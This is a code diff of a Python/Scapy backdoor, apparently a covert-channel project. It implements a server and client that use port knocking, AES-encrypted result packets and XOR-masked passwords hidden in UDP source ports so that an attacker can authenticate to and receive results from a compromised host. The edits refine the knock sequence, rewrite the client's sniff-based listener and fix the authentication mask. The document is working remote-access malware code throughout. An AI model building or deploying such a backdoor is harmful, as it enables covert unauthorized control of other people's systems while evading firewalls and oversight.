@@ -24,9 +24,13 @@ URG = 0x20
 ECE = 0x40
 CWR = 0x80
 
+# result packet variables
 PACKET_SIZE = 1024 # Total payload size for result packets (including our application-level headers)
 FIRST_PACKET_PAYLOAD_MAX = PACKET_SIZE - 16 - 4 - 4 - 8
 OTHER_PACKET_PAYLOAD_MAX = PACKET_SIZE - 8
+
+# port knocking variables
+KNOCKED_PORTS = [10000, 20000, 30000] # Until we add this as a config value, if ever
 
 def make_iv():
     """Creates a 16-byte initialisation vector for AES encryption using the current time."""
@@ -70,9 +74,8 @@ class BackdoorServer(object):
         raise NotImplementedError
 
     def port_knock(self):
-        knocked_ports = [10000, 20000, 30000] # Until we add this as a config value, if ever
         """Knock on ports decided by user"""
-        for port in knocked_ports:
+        for port in KNOCKED_PORTS:
             send(IP(dst=self.client)/TCP(dport=port),verbose=0)
         
 
@@ -131,7 +134,7 @@ class BackdoorServer(object):
         """
 
         retry_count = 5
-        knock_wait_time = 0.5
+        knock_wait_time = 3
         sock_timeout = 1
 
         covert_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -326,7 +329,7 @@ class UdpBackdoorServer(BackdoorServer):
         self.lport = listenport
 
     def listen(self):
-        
+        print("entered the UDP Listen")
         # If payload xor ((packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)) == pw, we have a client
         def is_auth(packet):
 
@@ -489,36 +492,32 @@ class BackdoorClient(object):
             print("Unhandled result type {}".format(result_type))
             sys.exit(1)
 
-    def knock_queue(self, queue):
-        while True:
-            result = queue.get()
-            self.port_knock()
-            queue.task_done()
-
-    def port_knock(self):
+    def listen_for_results(self):
         """ Open the TCP port and wait for the client to ping """
+        while True:
+            first_port = KNOCKED_PORTS[0]
 
-        tcpsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        tcpsock.bind(('', self.lport))
+            bpf_filter = "tcp dst port {}".format(first_port)
+            pkts = sniff(filter=bpf_filter, count=1)
 
-        print("listen")
-        tcpsock.listen(1)
-        conn, addr = tcpsock.accept()
-        print("conn" + conn + " addr " + addr)
-        while 1:
-            data = conn.recv(1024)
-            if not data: 
-                break
+            knocker = pkts[0]["IP"].src
+
+            for port in KNOCKED_PORTS[1:]:
+                bpf_filter = "src host {} and tcp dst port {}".format(knocker, port)
+                pkts = sniff(filter=bpf_filter, count=1, timeout=5)
+
+            # if we timed out while waiting for one of the knocks, continue listening
+            if not pkts:
+                continue
+
+            # should probably do a sanity check here as well to make sure that the server connecting to us is the same one that we configured via command line
+            # TODO: add firewall rule allowing server to connect to lport
+            result = self.recv_result()
+
+            print("Received result:")
+            print(str(result))
+            # TODO: remove firewall exception
 	
-    def client_thread(self):
-        port_knock_thread = Thread(target=self.knock_queue, args=(queue,))
-        port_knock_thread.setDaemon(True)
-        port_knock_thread.start()
-
-    def run(self, protocol):
-        raise NotImplementedError
-        """Runs in a loop listening for server port knocks"""
-
 class TcpBackdoorClient(BackdoorClient):
     def __init__(self, aeskey, password, listenport, serverport, server):
         super(TcpBackdoorClient, self).__init__(aeskey, password)
@@ -554,19 +553,19 @@ class TcpBackdoorClient(BackdoorClient):
 
 class UdpBackdoorClient(BackdoorClient):
     def __init__(self, aeskey, password, listenport, serverport, server):
-        super(TcpBackdoorClient, self).__init__(aeskey, password)
+        super(UdpBackdoorClient, self).__init__(aeskey, password)
         self.server = server
         self.lport = listenport
         self.dport = serverport
 
     def connect(self):
         # Insert the password into the packet so that the server can authenticate us
-        self.sport = RandShort()
-        xor_mask = self.sport << 48 + self.sport << 32 + self.sport << 16 + self.sport
+        self.sport = int(RandShort())
+        xor_mask = (self.sport << 48) + (self.sport << 32) + (self.sport << 16) + self.sport
         masked_pw = struct.pack("<Q", struct.unpack("<Q", self.password)[0] ^ xor_mask)
 
         try:
-            connpacket = IP(dst=self.server) / UDP(dport=self.dport, sport=self.sport) / Raw(load=masked_pw)
+            connpacket = IP(dst=self.server) / UDP(dport=self.dport, sport=self.sport) / masked_pw
             send(connpacket, verbose=0)
         except Exception, err:
             traceback.print_exc()
